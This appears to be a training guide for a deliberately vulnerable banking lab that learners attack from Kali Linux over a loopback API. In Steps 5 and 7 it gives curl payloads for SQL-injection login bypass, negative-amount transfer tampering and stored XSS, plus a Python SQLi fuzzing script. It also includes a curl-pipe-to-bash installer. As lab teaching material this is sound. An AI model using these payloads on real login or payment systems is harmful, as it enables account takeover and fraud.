# 🐉 Kali Linux Terminal Lab Connection & Penetration Testing Guide

> [!WARNING]
> ### ⚠️ STRICTLY FOR AUTHORIZED EDUCATIONAL CYBERSECURITY RESEARCH
> This guide and the AegisVault terminal connector are engineered exclusively for controlled classroom labs, red-team/blue-team training, and defensive security auditing. All attacks are constrained and isolated to the local lab environment (`127.0.0.1:8888`). Do not deploy these tools against unauthorized external systems.

---

## 🎯 Architectural Overview

The AegisVault Terminal Lab provides realistic command-line penetration-testing workflows from Kali Linux:

```
+----------------------------------------------------------------------------------+
|                            KALI LINUX WORKSTATION                                |
|                                                                                  |
|   1. 1-Line Connector: curl -sSL .../connect-kali.sh | bash                       |
|   2. Authentication Gate: (labuser / aegislab2026)                               |
|   3. Interactive CLI Shell: (aegis-term>)                                        |
|   4. Local Isolated REST API Gateway: (http://127.0.0.1:8888)                     |
|                                                                                  |
|   Learner Tools:                                                                 |
|   - curl commands                                                                |
|   - Burp Suite / OWASP ZAP (Proxy: 127.0.0.1:8080)                               |
|   - Custom Python exploit scripts                                                |
+----------------------------------------+-----------------------------------------+
                                         |
                       Local HTTP REST API Requests (Isolated)
                                         |
                                         v
+----------------------------------------------------------------------------------+
|                          ISOLATED LAB SANDBOX ENGINE                             |
|   - Endpoints: /api/v1/auth/login, /api/v1/transfer/wire, /api/v1/transfer/upi   |
|   - Defense Modes: HARDENED (Strict Security) vs PENTEST (Vulnerabilities Open)  |
|   - Real-time CEF / JSON Audit Telemetry Stream                                  |
+----------------------------------------------------------------------------------+
```

---

## 📋 The 9-Step Penetration-Testing Workflow

### Step 1: Start the AegisVault Bank Lab
Open the live bank application in your browser (or keep it open alongside your terminal):  
👉 **[https://nadeemmhdm.github.io/aegis-vault-bank/](https://nadeemmhdm.github.io/aegis-vault-bank/)**

---

### Step 2: Connect Kali Linux to the Lab
Open a terminal in Kali Linux and run the 1-line connector (**no cloning required**):
```bash
curl -sSL https://raw.githubusercontent.com/nadeemmhdm/aegis-vault-bank/main/connect-kali.sh | bash
```
Choose **Option 1** to launch the interactive terminal environment.

---

### Step 3: Authenticate with Lab Credentials
Before terminal access is granted, authenticate with authorized lab credentials:

| Role | Username | Password | Access Level |
| :--- | :--- | :--- | :--- |
| **Security Learner (Default)** | `labuser` | `aegislab2026` | Full Lab Shell & REST Gateway |
| **Bank Customer** | `alex.vance` | `password123` | Customer Profile & Ledger |
| **Lab Administrator** | `admin` | `adminlab2026` | System Administration |

Upon successful authentication, the terminal prompts with:
```text
[+] Authentication Successful! Welcome, labuser.
```

---

### Step 4: Terminal-Based Access (`aegis-term>`)
You are now in the dedicated **AegisVault Interactive Shell**:
```text
================================================================================
             🚀 AEGISVAULT PENETRATION-TESTING INTERACTIVE SHELL
================================================================================
 Target REST Gateway : http://127.0.0.1:8888
 Security Posture    : [ HARDENED ]
 Authorized Session  : labuser

 Type 'help' to view commands.
 Type 'run-exercise <name>' to execute hands-on testing exercises.
 Type 'curl-samples' to view copy-pasteable curl commands for Kali.
================================================================================
aegis-term> 
```

**Core Shell Commands:**
- `status`: View gateway URL, active security mode, customer balance, and telemetry counts.
- `mode pentest`: Relax defenses to observe and benchmark real vulnerabilities.
- `mode hardened`: Restore enterprise-grade defense models (parameterized queries, nonces).
- `exercises`: List all available penetration-testing modules.
- `run-exercise <name>`: Execute automated exercises (`sqli`, `xss`, `replay`, `tamper`).
- `curl-samples`: Print manual `curl` commands ready to paste into another Kali terminal.
- `burp-guide`: Show proxying setup for Burp Suite.
- `logs`: Inspect the real-time SIEM audit telemetry stream.
- `exit`: Terminate the session cleanly.

---

### Step 5: Perform Penetration-Testing Exercises

Open a second Kali terminal tab or execute directly in the interactive shell:

#### 🧪 Exercise A: SQL Injection (SQLi) Auth Bypass
1. In `aegis-term>`, switch to pentest mode:
   ```text
   aegis-term> mode pentest
   ```
2. Test the SQLi payload from your terminal:
   ```bash
   curl -X POST http://127.0.0.1:8888/api/v1/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email":"'\'' OR '\''1'\''='\''1'\'' --", "password":"arbitrary_password"}'
   ```
   **Result in Pentest Mode**: Response returns `200 OK` with `bypassed: true` and administrator session token.
3. Switch back to hardened mode (`mode hardened`) and repeat the curl command:
   **Result in Hardened Mode**: Response returns `401 Unauthorized` with `Security Violation: SQL meta-characters blocked`.

#### 🧪 Exercise B: Parameter Tampering (Negative Debit Inversion)
1. Send an inverted negative transfer amount:
   ```bash
   curl -X POST http://127.0.0.1:8888/api/v1/transfer/wire \
     -H "Content-Type: application/json" \
     -d '{"recipient":"AC-4491-0021", "amount": -5000.00, "memo":"exploit_probe"}'
   ```
2. In Pentest Mode, the negative amount inverts the balance delta, crediting `+$5,000.00`.
3. In Hardened Mode, the mathematical range filter rejects the request with `400 Bad Request`.

#### 🧪 Exercise C: Stored XSS in Wire & UPI Memos
1. Inject an image error payload in the memo field:
   ```bash
   curl -X POST http://127.0.0.1:8888/api/v1/transfer/wire \
     -H "Content-Type: application/json" \
     -d '{"recipient":"AC-4491-0021", "amount": 15.00, "memo":"<img src=x onerror=alert(1)>"}'
   ```
2. In Pentest Mode, the unescaped memo is stored and rendered directly.
3. In Hardened Mode, the string is sanitized into HTML entities (`&lt;img...&gt;`).

#### 🧪 Exercise D: Anti-Replay Nonce Duplication Test
1. Send a transaction with a designated nonce:
   ```bash
   curl -X POST http://127.0.0.1:8888/api/v1/transfer/wire \
     -H "Content-Type: application/json" \
     -H "X-Aegis-Nonce: 1726500000.nonce_token_alpha" \
     -d '{"recipient":"AC-4491-0021", "amount": 50.00, "memo":"Wire 1"}'
   ```
2. Immediately repeat the exact same curl request.
3. In Hardened Mode, the request is rejected with `409 Conflict: Anti-Replay Violation: Nonce already consumed`.

---

### Step 6: Testing with Burp Suite in Kali Linux
1. Start Burp Suite in Kali: `burpsuite &`.
2. Ensure proxy listener is active on `127.0.0.1:8080`.
3. Route terminal curl commands directly through Burp proxy:
   ```bash
   curl -x http://127.0.0.1:8080 -X POST http://127.0.0.1:8888/api/v1/transfer/wire \
     -H "Content-Type: application/json" \
     -d '{"recipient":"AC-4491-0021", "amount": 100.00, "memo":"Intercepted via Burp"}'
   ```
4. In Burp Suite:
   - Navigate to **Proxy** > **HTTP history**.
   - Inspect the request and response headers.
   - Right-click and choose **Send to Repeater** (`Ctrl+R`) to craft and test custom fuzzing payloads.

---

### Step 7: Testing with Custom Python Scripts
Create `exploit_test.py` in your Kali terminal:
```python
#!/usr/bin/env python3
import urllib.request
import json

TARGET = "http://127.0.0.1:8888/api/v1/auth/login"

payloads = [
    "' OR '1'='1' --",
    "admin' --",
    "' OR 1=1 #",
    "alex.vance@aegisvault.internal"
]

print("[*] Fuzzing AegisVault Auth Endpoint with Python...")
for p in payloads:
    req_body = json.dumps({"email": p, "password": "test"}).encode()
    req = urllib.request.Request(TARGET, data=req_body, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req) as res:
            data = json.loads(res.read().decode())
            print(f"[+] Payload: {p} -> SUCCESS (HTTP 200) Bypassed: {data.get('bypassed', False)}")
    except urllib.error.HTTPError as e:
        print(f"[-] Payload: {p} -> BLOCKED (HTTP {e.code})")
```
Run with:
```bash
python3 exploit_test.py
```

---

### Step 8: Strict Environment Isolation
- All attacks and API requests are routed strictly to `127.0.0.1:8888` on loopback.
- The lab never makes external network calls during testing exercises.
- External production banking infrastructure is never contacted or accessible.

---

### Step 9: Real-Time Telemetry & Educational Monitoring
Every action performed from the Kali terminal is captured in the audit telemetry engine.
- To view live logs in the Kali terminal:
  ```text
  aegis-term> logs
  ```
- To view live logs in the web application:
  Open the **Security & Compliance** view to observe cryptographic hash chains and risk scores updating dynamically.
